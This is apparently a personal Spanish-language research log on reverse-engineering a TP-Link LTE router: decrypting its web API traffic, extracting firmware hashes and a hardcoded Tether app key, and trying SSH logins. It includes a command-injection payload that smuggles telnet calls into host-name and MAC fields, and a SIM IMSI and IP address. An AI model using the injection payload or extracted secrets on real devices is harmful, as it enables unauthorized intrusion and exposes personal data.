Recargar la página de status cada 2.5"
Meter en la consola:
setInterval(function() { $.reload(); }, 2500);


# Obtener la red mediante un curl

Las peticiones van encriptadas con AES

Petición encriptada:
sign=1b2e1b4f0c7bb64ceb1d707b264bed60b01642fc68979f4c249978cee623ca9019a858793054c813e29af44636e775066b9943019f8f4ba1483e9c8c5d886449
data=e2JMM11MGb8fUF7i2rKIi8jEzQ+YeOx22B9/vh89iTfUiKp3OpoeoW/oPiM3rJUc9Oum39/FteK5CWMSEDsh4SJvfEr5+qmyPyQQPgTMKKMD6a0KDlFJjhZTBN9b4Z34wqJ4LMkVpYVsmp+4dpmMeLgxcOGWx6SsIqttLwRsiNFUwACkfoi2T9u1jHOOzdYVDQuSqXVzFWfDtX8lKSYQFcrXXOa3D7kFWG6IgVgVx1iNg5VifSgyb2myuQQ2o/QSwJXmCw6leI83yPKCygETL0RQ40d/A7NDzcCT46fMKgNkTZQftUYdnXVSCBCgE/z47Nr8AMBrtMIxGMERjKHZwxl1XMp16lHtc1THYwWLjpI15CYFHhzvgQSpgm1rmcxG9hH0FzRR9EDLKXFcYhNn1ekWp95ger1CddDnSLvZYq0=

Petición sin encriptar:
1&1&1&1
[WAN_LTE_LINK_CFG#2,1,0,0,0,0#0,0,0,0,0,0]0,0
[WAN_LTE_INTF_CFG#2,0,0,0,0,0#0,0,0,0,0,0]1,8
dataLimit
enablePaymentDay
curStatistics
totalStatistics
enableDataLimit
limitation
curRxSpeed
curTxSpeed
[LTE_NET_STATUS#2,1,0,0,0,0#0,0,0,0,0,0]2,0
[LTE_PROF_STAT#2,1,0,0,0,0#0,0,0,0,0,0]3,0



Respuesta encriptada:
azSdtE+E5kQ6iRlf8sf5D/T2aIGAJhFGnddjsiyqkmolAlYZSj8HxC4xUptnidgtToJaCqwLQCpHR6kfktfH52Hc7iR9PFf8xGM4D9JU5v60/qZ+I+CFzTHCW2rn1J+30cURTFWFzwu4HvinpmBFSRo4u0VgfDxj1yyX17RGskUgFjJXGEAT2DOIf0l/WXMFrV4lOE7cVeZ+YvowRzroJnfk7SzmRqJCm6DwERU2FUE5iCd97wOkN3XIbG/ZJSGhDu8wf9K5X7V5tW9qwxif4ETbkBhofsK3p7IEmeyMlQSlWEHBe7NPj8zEqsnKalzxfTC620s/eC6qLCZ8ds6v1Ld9AuRnym+vioyjrXqPzFdp/OElWzhHekEOFUUQ3OfsRiKdZazI6zzMwm93lUlg8kOlmXt+liJWzfoa8UJs21MDabkdVD8NsCk96J+WqMYdwCyY5MBB9uiCb5AWc1dLPUh3FK2FyqEGxPWwVfHQo+Kcx7znUnIJAIzDPI07+2djQhwUW5MfXhXgMKTFVLeI3bwFlBLWENwOPQK/uXDQKkpqOnc8jl9WUkRV/MoExcwksj815uK97ApXpDJ9tZLehAd84W6nZuqcRr2YdltlXqwv69MrsjEQL1/jCnRUqBT/Qp6S7eGfJVfppQ1KujxRptpEp3ubFLbjTRYIUsx+k9qIbEb7+biJG6mZxUAvdEbiRmiRpNHNgdDlBkeiovPepIRlFnCAUk6yJfN/4/l3/iELXzdHOrvSyjpbLep3F0wYZGIf4VOqzyhNnyVQZKJ7wHlaE/1w3hpVynVtKwMrRh5jsFxAg76IHvPmAVpeMPfP27N0GmCVGka9DhqRJTH1TZzTMOzW5g8eAeNNOPDOLU5iuS2V3dDNV8HyPWeTLkTzmXzTtoUSdhm4t5LVHutA9qsdcQtb3Nn+vCDxawtryzcCxfMfp8+xM01RVDmXV57G/R9Mui6Uo3Z/dbF1emRNsyoo6GPn1NsmrQi3F60JJuYgDYPkWYf66sqvE9gNV9XLjBL1xZQBU/DTHBdp4na6JI4BYaTzo8TkOCaRzLl5DHUVm8AYPZhaGJn5vCsnIVy1qitpsnDPZWjvOPT8l0m6wc+dqN97A0YAVIlXkUwYXVUkufJfLVrk9BnFOVdC711CiEWdBrfLEHa4m8M3KpmqrXOLo1hNDIUBivkM3SjJWZy6F+3ntGHile8o2oOn+eBzqttznB5U1cFbFw7iy1bK0MzqbhQlvLyVRDR69whMWz0Ai5zBwd+3sKizIFcEbh7Ttyl6HbrV7rLTZ9MSdcrRNMQMOlgxX3y3oGdDgkvM1dXARjPgnCT9t9db4uXbz2I1l3+mGwHMf432apOrxTmAHVpkbRGzEUpZvb/u6tkhjJhULIKa2MyFrOeQgWYinGH3xyE3/xRvFOrD3D+cRf3IJWFSdlGUVB59D90EAxA8uJVSDFPo31KTy/bW/mFvAj6sQS3Y4u1Q4ujhN01vSOklKGsIK/JtfRhkae5HDuACZeNp9UZb7d2fqo0TuvmHIqF0vt+Xfgi2lkXW25duCA8Gnw==

Respuesta sin encriptar:
 [2,1,0,0,0,0]0
enable=1
wispConnStat=0
networkType=2
roamingStatus=0
connectStatus=4
simStatus=3
simCardNumber=0
simCardType=0
simCardState=1
simCardImsi=214075545008174
simCardGid1=10
dataSwitch=1
roamSwitch=0
prefNet=3
netSelMode=0
timeFactroyFlag=0
wlanFactoryFlag=0
smsScEnable=0
smsScAddress=34609090909
signalStrength=2
ipv4=2.140.77.135
dns1v4=80.58.61.250
dns2v4=80.58.61.254
ipv4_mtu=1500
ipv6=
ipv6PrefixLen=0
dns1v6=
dns2v6=
ipv6_mtu=0
ifName=wwan0
gatewayV4=2.140.77.136
gatewayV6=
netmask=255.255.255.240
[2,0,0,0,0,0]1
dataLimit=0
enablePaymentDay=0
curStatistics=0
totalStatistics=1504177764.4000
enableDataLimit=0
limitation=0
curRxSpeed=12836
curTxSpeed=68125
[2,1,0,0,0,0]2
ussdSessionStatus=0
ussdStatus=0
smsUnreadCount=0
smsSendCause=0
smsSendResult=3
rfSwitch=1
sigLevel=2
connStat=4
roamStat=0
regStat=1
netType=2
srvStat=2
netSelStat=0
rfInfoChannel=3034
rfInfoBand=87
rfInfoIf=5
rfInfoRat=2
rfInfoRssi=-98
rfInfoRsrp=0
rfInfoRsrq=0
rfInfoSnr=0
rfInfoEcio=11
region=
[2,1,0,0,0,0]3
activeProfType=0
activeProfIndex=0
spn=Movistar
ispWhich=0
ispCount=3
ispMnc=7
ispMcc=214
ispName=Movistar
usrWhich=9
usrCount=0
usrMnc=7
usrMcc=214
[error]0



aesKeyString: "key=1618766498659228&iv=1618766498659317"
hash: "021b6032d2b4b140932426334acbaed3"



CryptoJS.AES.decrypt(encrypted, this._keyUtf8, op);
encrypted = "LuijJeMijhwGEWWq0UMPiLJGuVxIMRvu1nti+/uAFryysDA4iP/J+MZTHiLsPPQd"
this._keyUtf8 =
  sigBytes: 16
  words: (4) […]
  0: 825635128
  1: 926299700
  2: 959985205
  3: 959590968
  length: 4

op:
  iv: {…}
  sigBytes: 16
  words: (4) […]
  0: 825635128
  1: 926299700
  2: 959985205
  3: 959656247
  length: 4



Como generan la clave/iv
    var key = ((new Date).getTime() + '' + 1000000000 * Math.random()).substr(0, 16),
    iv = ((new Date).getTime() + '' + 1000000000 * Math.random()).substr(0, 16);
    return this.key = key,
    this._keyUtf8 = CryptoJS.enc.Utf8.parse(key),
    this.iv = iv,
    this._ivUtf8 = CryptoJS.enc.Utf8.parse(iv),
    {
      key: key,
      iv: iv
    }

la key el iv se lo envían como "sign", encriptado con rsa, en el login

Luego solo envian un hash en el "sign"



## Login
➜ curl 'http://192.168.1.1/cgi/getParm' -H 'Referer: http://192.168.1.1/'
var ee="010001";
var nn="D7C514F427274DA934CACA42B25B15AD187A234D22024675E318A9873A2A2361438B93A9747E6BE9B2766797E54A0DFFA65804E740C85C47F7476597AC1A2ECB";
var userSetting=1;
var seq="987893306";
$.ret=0;

Aqui nos pasa la clave RSA a usar (ee y nn)


Ahora el cliente le envía las claves AES generadas, encriptado con RSA:
  h es el hash
  s es el "seq": this.seq+datalen
"key=1618769477313689&iv=1618769477313393&h=021b6032d2b4b140932426334acbaed3&s=439594336"
Tambien le envia el login, también encriptado con rsa, como
USUARIO\nPASSWORD


# Analisis firmware
Con binwalk -e extraemos los ficheros.

squashfs-root/etc/passwd.bak
admin:$1$$iC.dUsGpxNNJGeOm1dFio/:0:0:root:/:/bin/sh
También usuario dropbear sin pass

system/etc/shadow
root:C98ULvDZe7zQ2:18600:0:99999:7:::

Parece que usa dropbear como server ssh
SSH-2.0-dropbear_2017.75
https://matt.ucc.asn.au/dropbear/CHANGES

- Make failure delay more consistent to avoid revealing valid usernames, set server password 
  limit of 100 characters. Problem reported by usd responsible disclosure team

- Change handling of failed authentication to avoid disclosing valid usernames,
  CVE-2018-15599.
https://old.reddit.com/r/blackhat/comments/97ywnm/openssh_username_enumeration/e4e05n2/

- Merged fuzzing code, see FUZZER-NOTES.md


No funciona la pass de root (que parece desncriptada).
La de admin no se que encript tiene, ya que md5 es $1$, pero ahí tiene dos dolares.

El server web parece custom, probablemente un remote code execution
strings squashfs-root/usr/bin/httpd

ip -6 neigh show %s > /var/run/ip6_neigh
%*s dev %*s lladdr %s %*s
ip6tables -A INPUT %s -p tcp --dport %d -j ACCEPT
ip6tables -D INPUT %s -p tcp --dport %d -j ACCEPT

squashfs-root/etc/init.d/rcS
/bin/mkdir -m 0777 -p /var/samba/lib
/bin/mkdir -m 0777 -p /var/samba/private
/bin/mkdir -m 0777 -p /var/samba/var/locks
cp -p /etc/passwd.bak /var/passwd


Si pudiesemos hacer ejecución remota, tal vez estos comandos nos podrían indicar que lo estamos consiguiendo
echo 1 > /proc/tplink/led_wlan_24G
echo 1 > /proc/tplink/led_wlan_5G
echo 0 > /proc/tplink/led_wlan_24G
echo 0 > /proc/tplink/led_wlan_5G
echo 1 > /proc/tplink/led_wlan_status


squashfs-root/usr/bin/cos
programa custom que parece que lleva bastante manejo del router


squashfs-root/lib/libcmm.so
librería que tiene claves que se envian desde el cliente web para configurar cosas, como obtener los ip6 neighbours

ifconfig %s up
ifconfig %s %s up
ifconfig %s %s netmask %s up
ifconfig %s %s/64
ifconfig %s del %s/64


/var/tmp/dropbear/dropbearpwd
username:dropbear
password:%s
isFactoryDefault:%c
loginMode:%u
/var/tmp/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f %s &
/var/tmp/dropbear/dropbear_dss_host_key
dropbearkey -t dss -f %s &
dropbear -p %d -r %s -d %s -A %s &

upnpd  -L  %s  -W  %s  -en  %d  -nat %d -port %d  -url  "%s"  -ma  "%s"  -mn  "%s"  -mv  "%s"  -desc  "%s" &

iptables -t nat -D PREROUTING_DMZ -d %s                 -j DNAT --to-destination %s

  varias como estas


data = "2&2\r\n[INTERNAL_HOST#0,0,0,0,0,0#0,0,0,0,0,0]0,4\r\ntype=1\r\nentryName=\"`telnet 192.168.1.102 9000`\"#`telnet 192.168.1.102 9000`:AA:AA:AA:AA_bl\r\nmac=$(telnet 192.168.1.102 9000)aa:aa:aa:aa:aa:aa\r\nisParentCtrl=0\r\n[RULE#0,0,0,0,0,0#0,0,0,0,0,0]1,7\r\nisParentCtrl=0\r\nruleName=\"`telnet 192.168.1.102 9000`\"#$(telnet 192.168.1.102 9000)AA:AA:AA_bl\r\ninternalHostRef=\"`telnet 192.168.1.102 9000`\"#$(telnet 192.168.1.102 9000):AA:AA:AA_bl\r\nexternalHostRef=\r\nscheduleRef=\r\naction=1\r\nenable=1\r\n"


## adb
por cosas que veo en los binarios httpd y cos, parece que el router tiene un dongle 3g para conectar a internet que maneja mediante adb

# App tether
Extrayendo el contenido del .apk
assets/tether_client.p12
para acceder por ssh. encriptada

Clave para desencriptarla en smali/com/tplink/libtpnbu/b/d.smali
"TPLINKtether2018!"

vi smali/com/tplink/a/a/b.smali smali/com/tplink/a/a/a.smali smali_classes2/com/tplink/tether/tmp/a/d.smali smali_classes2/com/tplink/tether/fragments/dashboard/homecare_payment/scan/ui/h.smali

Con la clave desncriptada y los tipicos users no me deja entrar.
ssh 192.168.1.1 -l admin -i assets/tether_client.pem
admin
root
dropbear
toor



# Info OpenWRT
https://openwrt.org/toh/tp-link/archer_mr200
